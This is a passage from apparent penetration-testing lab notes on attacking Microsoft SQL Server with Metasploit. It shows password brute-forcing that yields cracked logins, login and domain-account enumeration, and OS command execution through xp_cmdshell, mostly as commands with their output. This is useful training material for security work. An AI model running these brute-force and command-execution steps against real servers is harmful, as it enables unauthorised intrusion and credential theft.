|       output
|       ======
|       Null
|       Windows IP Configuration
|       Null
|       Null
|       Ethernet adapter Ethernet:
|       Null
|          Connection-specific DNS Suffix  . : ap-south-1.compute.internal
|          Link-local IPv6 Address . . . . . : fe80::561:df8c:335e:33f3%3
|          IPv4 Address. . . . . . . . . . . : 10.5.29.39
|          Subnet Mask . . . . . . . . . . . : 255.255.240.0
|          Default Gateway . . . . . . . . . : 10.5.16.1
|       Null
|       Tunnel adapter isatap.ap-south-1.compute.internal:
|       Null
|          Media State . . . . . . . . . . . : Media disconnected
|          Connection-specific DNS Suffix  . : ap-south-1.compute.internal
|       Null
|       Tunnel adapter Local Area Connection* 3:
|       Null
|          Media State . . . . . . . . . . . : Media disconnected
|          Connection-specific DNS Suffix  . : 
|_      Null
```

Instead of ipconfig, we can also do other things like read a file using `type c:\flag.txt`.

## MSSQL Metasploit

Instead of Nmap we can use Metasploit too for the MSSQL enumeration and brute force

```sh
msf6 > use auxiliary/scanner/mssql/mssql_login 
msf6 auxiliary(scanner/mssql/mssql_login) > set user_file /root/Desktop/wordlist/common_users.txt
user_file => /root/Desktop/wordlist/common_users.txt
msf6 auxiliary(scanner/mssql/mssql_login) > set pass_file /root/Desktop/wordlist/100-common-passwords.txt
pass_file => /root/Desktop/wordlist/100-common-passwords.txt
msf6 auxiliary(scanner/mssql/mssql_login) > set verbose false
verbose => false
msf6 auxiliary(scanner/mssql/mssql_login) > run

[*] 10.5.23.109:1433      - 10.5.23.109:1433 - MSSQL - Starting authentication scanner.
[+] 10.5.23.109:1433      - 10.5.23.109:1433 - Login Successful: WORKSTATION\sa:
[+] 10.5.23.109:1433      - 10.5.23.109:1433 - Login Successful: WORKSTATION\dbadmin:anamaria
[+] 10.5.23.109:1433      - 10.5.23.109:1433 - Login Successful: WORKSTATION\auditor:nikita
[*] 10.5.23.109:1433      - Scanned 1 of 1 hosts (100% complete)
```

Another useful script for MSSQL enum:

```sh
msf6 auxiliary(scanner/mssql/mssql_login) > use auxiliary/admin/mssql/mssql_enum
msf6 auxiliary(admin/mssql/mssql_enum) > run
[*] Running module against 10.5.23.109

[*] 10.5.23.109:1433 - Running MS SQL Server Enumeration...
[*] 10.5.23.109:1433 - Version:
[*]	Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
[*]		Sep 24 2019 13:48:23 
[*]		Copyright (C) 2019 Microsoft Corporation
[*]		Express Edition (64-bit) on Windows Server 2016 Datacenter 10.0 <X64> (Build 14393: ) (Hypervisor)
[*] 10.5.23.109:1433 - Configuration Parameters:
[*] 10.5.23.109:1433 - 	C2 Audit Mode is Not Enabled
[*] 10.5.23.109:1433 - 	xp_cmdshell is Enabled
[*] 10.5.23.109:1433 - 	remote access is Enabled
[*] 10.5.23.109:1433 - 	allow updates is Not Enabled
[*] 10.5.23.109:1433 - 	Database Mail XPs is Not Enabled
[*] 10.5.23.109:1433 - 	Ole Automation Procedures are Not Enabled
[*] 10.5.23.109:1433 - Databases on the server:
[*] 10.5.23.109:1433 - 	Database name:master
[*] 10.5.23.109:1433 - 	Database Files for master:
[*] 10.5.23.109:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\master.mdf
[*] 10.5.23.109:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\mastlog.ldf
[*] 10.5.23.109:1433 - 	Database name:tempdb
[*] 10.5.23.109:1433 - 	Database Files for tempdb:
[*] 10.5.23.109:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\tempdb.mdf
[*] 10.5.23.109:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\templog.ldf
[*] 10.5.23.109:1433 - 	Database name:model
[*] 10.5.23.109:1433 - 	Database Files for model:
[*] 10.5.23.109:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\model.mdf
[*] 10.5.23.109:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\modellog.ldf
[*] 10.5.23.109:1433 - 	Database name:msdb
[*] 10.5.23.109:1433 - 	Database Files for msdb:
[*] 10.5.23.109:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\MSDBData.mdf
[*] 10.5.23.109:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\MSDBLog.ldf
[*] 10.5.23.109:1433 - System Logins on this Server:
.
.
```

another script is for sql login:

<pre class="language-sh"><code class="lang-sh">msf6 auxiliary(admin/mssql/mssql_enum) > use auxiliary/admin/mssql/mssql_enum_sql_logins 
msf6 auxiliary(admin/mssql/mssql_enum_sql_logins) > run
[*] Running module against 10.5.23.109

[*] 10.5.23.109:1433 - Attempting to connect to the database server at 10.5.23.109:1433 as sa...
[+] 10.5.23.109:1433 - Connected.
[*] 10.5.23.109:1433 - Checking if sa has the sysadmin role...
<strong>[+] 10.5.23.109:1433 - sa is a sysadmin.
</strong>[*] 10.5.23.109:1433 - Setup to fuzz 300 SQL Server logins.
[*] 10.5.23.109:1433 - Enumerating logins...
[+] 10.5.23.109:1433 - 38 initial SQL Server logins were found.
[*] 10.5.23.109:1433 - Verifying the SQL Server logins...
[+] 10.5.23.109:1433 - 16 SQL Server logins were verified:
[*] 10.5.23.109:1433 -  - ##MS_PolicyEventProcessingLogin##
[*] 10.5.23.109:1433 -  - ##MS_PolicyTsqlExecutionLogin##
[*] 10.5.23.109:1433 -  - ##MS_SQLAuthenticatorCertificate##
[*] 10.5.23.109:1433 -  - ##MS_SQLReplicationSigningCertificate##
[*] 10.5.23.109:1433 -  - ##MS_SQLResourceSigningCertificate##
[*] 10.5.23.109:1433 -  - BUILTIN\Users
[*] 10.5.23.109:1433 -  - EC2AMAZ-5861GL6\Administrator
[*] 10.5.23.109:1433 -  - NT AUTHORITY\SYSTEM
[*] 10.5.23.109:1433 -  - NT SERVICE\SQLTELEMETRY$SQLEXPRESS
[*] 10.5.23.109:1433 -  - NT SERVICE\SQLWriter
[*] 10.5.23.109:1433 -  - NT SERVICE\Winmgmt
[*] 10.5.23.109:1433 -  - NT Service\MSSQL$SQLEXPRESS
[*] 10.5.23.109:1433 -  - admin
[*] 10.5.23.109:1433 -  - auditor
[*] 10.5.23.109:1433 -  - dbadmin
[*] 10.5.23.109:1433 -  - sa
[*] Auxiliary module execution completed
</code></pre>

To run commands, we can use the following scanner:

```sh
msf6 auxiliary(admin/mssql/mssql_enum_sql_logins) > use auxiliary/admin/mssql/mssql_exec 
msf6 auxiliary(admin/mssql/mssql_exec) > set cmd whoami
cmd => whoami
msf6 auxiliary(admin/mssql/mssql_exec) > run
[*] Running module against 10.5.23.109

[*] 10.5.23.109:1433 - SQL Query: EXEC master..xp_cmdshell 'whoami'

 output
 ------
 nt service\mssql$sqlexpress
```

To enumerate the domain accounts, we can use the following command:

```sh
msf6 auxiliary(admin/mssql/mssql_exec) > use auxiliary/admin/mssql/mssql_enum_domain_accounts
msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) > exploit
[*] Running module against 10.5.23.109

[*] 10.5.23.109:1433 - Attempting to connect to the database server at 10.5.23.109:1433 as sa...
[+] 10.5.23.109:1433 - Connected.
[*] 10.5.23.109:1433 - SQL Server Name: EC2AMAZ-5861GL6
[*] 10.5.23.109:1433 - Domain Name: CONTOSO
[+] 10.5.23.109:1433 - Found the domain sid: 010500000000000515000000cf4b5eb619bca0ed968e21ef
[*] 10.5.23.109:1433 - Brute forcing 10000 RIDs through the SQL Server, be patient...
[*] 10.5.23.109:1433 -  - EC2AMAZ-5861GL6\Administrator
[*] 10.5.23.109:1433 -  - CONTOSO\Guest
[*] 10.5.23.109:1433 -  - CONTOSO\krbtgt
[*] 10.5.23.109:1433 -  - CONTOSO\DefaultAccount
[*] 10.5.23.109:1433 -  - CONTOSO\Domain Admins
[*] 10.5.23.109:1433 -  - CONTOSO\Domain Users
[*] 10.5.23.109:1433 -  - CONTOSO\Domain Guests
[*] 10.5.23.109:1433 -  - CONTOSO\Domain Computers
[*] 10.5.23.109:1433 -  - CONTOSO\Domain Controllers
[*] 10.5.23.109:1433 -  - CONTOSO\Cert Publishers
[*] 10.5.23.109:1433 -  - CONTOSO\Schema Admins
[*] 10.5.23.109:1433 -  - CONTOSO\Enterprise Admins
[*] 10.5.23.109:1433 -  - CONTOSO\Group Policy Creator Owners
[*] 10.5.23.109:1433 -  - CONTOSO\Read-only Domain Controllers
[*] 10.5.23.109:1433 -  - CONTOSO\Cloneable Domain Controllers
[*] 10.5.23.109:1433 -  - CONTOSO\Protected Users
[*] 10.5.23.109:1433 -  - CONTOSO\Key Admins
[*] 10.5.23.109:1433 -  - CONTOSO\Enterprise Key Admins
[*] 10.5.23.109:1433 -  - CONTOSO\RAS and IAS Servers
[*] 10.5.23.109:1433 -  - CONTOSO\Allowed RODC Password Replication Group
[*] 10.5.23.109:1433 -  - CONTOSO\Denied RODC Password Replication Group
[*] 10.5.23.109:1433 -  - CONTOSO\SQLServer2005SQLBrowserUser$EC2AMAZ-5861GL6
[*] 10.5.23.109:1433 -  - CONTOSO\MSSQL-SERVER$
[*] 10.5.23.109:1433 -  - CONTOSO\DnsAdmins
[*] 10.5.23.109:1433 -  - CONTOSO\DnsUpdateProxy
[*] 10.5.23.109:1433 -  - CONTOSO\alice
[*] 10.5.23.109:1433 -  - CONTOSO\bob
[*] 10.5.23.109:1433 -  - CONTOSO\sysadmin
[+] 10.5.23.109:1433 - 29 user accounts, groups, and computer accounts were found.
[*] 10.5.23.109:1433 - Query results have been saved to: /root/.msf4/loot/20231229160659_default_10.5.23.109_mssql.domain.acc_238445.txt
[*] Auxiliary module execution completed
```



[^1]: setg is used to declare the rhosts as global so that we don't have to specify it again and again in a single session.
